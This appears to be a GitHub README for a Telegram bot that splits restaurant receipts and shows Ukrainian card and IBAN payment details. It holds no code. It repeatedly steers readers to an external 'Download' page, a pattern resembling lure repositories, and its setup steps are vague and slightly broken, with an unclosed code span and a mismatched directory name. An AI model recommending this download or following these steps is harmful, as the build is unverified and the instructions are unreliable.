# BillSplitterUA v1 - Telegram bot 2026

> **BillSplitterUA is a Telegram bot that turns restaurant receipt scans into shared bill calculations and Ukrainian payment details, making group reimbursements easier to organize.**

[![Platform](https://img.shields.io/badge/Platform-Telegram-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lhoffmann50/billsplitterua-receipt-bot?style=flat-square)](https://github.com/lhoffmann50/billsplitterua-receipt-bot)

---

<p align="center">
  <a href="https://lhoffmann50.github.io/billsplitterua-receipt-bot/">
    <img src="https://img.shields.io/badge/Download-BillSplitterUA%20Latest-brightgreen?style=for-the-badge" alt="Download BillSplitterUA">
  </a>
</p>

> **[Download BillSplitterUA v1](https://lhoffmann50.github.io/billsplitterua-receipt-bot/)**

---

[Download Latest Build](https://lhoffmann50.github.io/billsplitterua-receipt-bot/)

---

## What BillSplitterUA Does

Turning a shared restaurant receipt into fair payment requests can take unnecessary time. BillSplitterUA handles that process in Telegram by reading receipt images, identifying the listed items, and calculating the amount each participant should cover.

It is intended for friends, coworkers, and groups sharing a meal. Along with the split result, the bot can provide Ukrainian payment information, including card and IBAN details, so the transition from reviewing the receipt to requesting repayment is more direct.

---

## Main Capabilities

- Accepts restaurant receipt scans through Telegram
- Extracts individual items from receipt images
- Works out the amount owed by each person
- Supports dividing expenses among multiple participants
- Displays Ukrainian payment information for reimbursements
- Handles both card and IBAN details
- Makes post-meal repayment coordination simpler
- Keeps the process within a fast, chat-based interaction

---

## Getting Started

1. Download or clone the repository:
   - `git clone https://github.com/lhoffmann50/billsplitterua-receipt-bot.git
2. Move into the project directory:
   - `cd BillSplitterUAbot`
3. Configure the bot with your Telegram credentials and select a deployment method.
4. Run the bot through the runtime or hosting arrangement you use.

For the published build, use the latest download link and apply the launch steps provided for your environment.

---

## Using the Bot

1. Open the bot in Telegram and begin a conversation.
2. Upload a restaurant receipt image or scan.
3. Check the recognized items and resulting bill division.
4. Send the produced payment information to the other participants.
5. Receive repayment through the supplied card or IBAN details.

The basic flow is:

- Submit a receipt
- Extract the items
- Calculate the group shares
- Add payment information
- Simplify collection

---

## Settings

The exact configuration process depends on the deployment approach. Typically, Telegram credentials and payment information are supplied through environment variables or a local configuration file.

Example:

    TELEGRAM_BOT_TOKEN=your_token_here
    PAYMENT_CARD=your_card_details
    PAYMENT_IBAN=your_iban_here
    COUNTRY=Ukraine

Replace these example values with the settings for your installation and the payment details that should be shown to users.

---

## Requirements

- A Telegram account with access to a bot
- A runtime compatible with your chosen deployment method
- Receipt images or scans to process
- Internet connectivity for Telegram communication
- Ukrainian card or IBAN details when payment information should be displayed

---

## Frequently Asked Questions

**How can I find new versions?**  
Look at the repository releases or use the latest build link to check for updates and deployment instructions.

**How are the payment details updated?**  
Change the card and IBAN values in the bot's configuration, generally through environment variables or a local settings file.

**What should I do when the receipt is read incorrectly?**  
Send a sharper image or a better scan and try again. The extracted items may also require manual review.

**Is the bot usable outside Ukraine?**  
Its payment workflow is built around Ukrainian payment details. If you use it elsewhere, adjust the payment fields and deployment settings to fit your situation.

**Where can I get support?**  
Submit a question through the repository issue tracker or use the project's discussion channels when those options are available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
